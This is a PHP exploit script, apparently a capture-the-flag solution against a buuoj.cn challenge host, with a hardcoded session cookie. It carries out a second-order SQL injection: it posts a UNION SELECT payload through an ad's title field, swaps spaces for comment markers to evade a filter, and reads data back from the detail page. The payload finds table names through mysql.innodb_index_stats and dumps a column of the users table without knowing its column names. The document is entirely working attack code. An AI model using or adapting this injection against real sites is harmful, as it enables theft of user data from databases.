<?php
// tags: sqli

$url = 'http://5c17e14a-e531-4040-869a-120e5d8d6106.node4.buuoj.cn:81/';
$cookies = 'PHPSESSID=d7271ed126feaa678dd99884ba1438e0';


function post_data($cmd) {
    global $url, $cookies;
    
    $ch = curl_init($url . 'addads.php');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'title' => $cmd,
            'content' => '',
            'ac' => 'add'
        ]),
        CURLOPT_COOKIE => $cookies
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!preg_match('/window\.location\.href/', $response)) {
        die($response);
    }

    return $response;
}

function get_response() {
    global $url, $cookies;
    
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE => $cookies
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    preg_match('/detail.php\?id=(\d+)/m', $response, $matches);

    if ($matches) {
        $id = $matches[1];
    }
    else {
        die('no id found!');
    }

    $ch = curl_init($url . 'detail.php?id=' . $id);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE => $cookies
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

function delete_data() {
    global $url, $cookies;
    
    $ch = curl_init($url . 'empty.php');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIE => $cookies
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// $cmd = "' UNION SELECT 1,(select group_concat(table_name) from mysql.innodb_index_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'";
$cmd = "' UNION SELECT 1,(SELECT group_concat(`3`) from (select 1, 2, 3 from users union select * from users) t),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'";

$cmd = str_replace(' ', '/**/', $cmd);

delete_data();
post_data($cmd);

$response = get_response();
file_put_contents('a.html', $response);

preg_match_all('/<td>(.*)<\/td>/U', $response, $matches);
if (!$matches[1]) {
    preg_match_all("/red'>(.*)<\/f/", $response, $matches);
}
var_dump($matches[1]);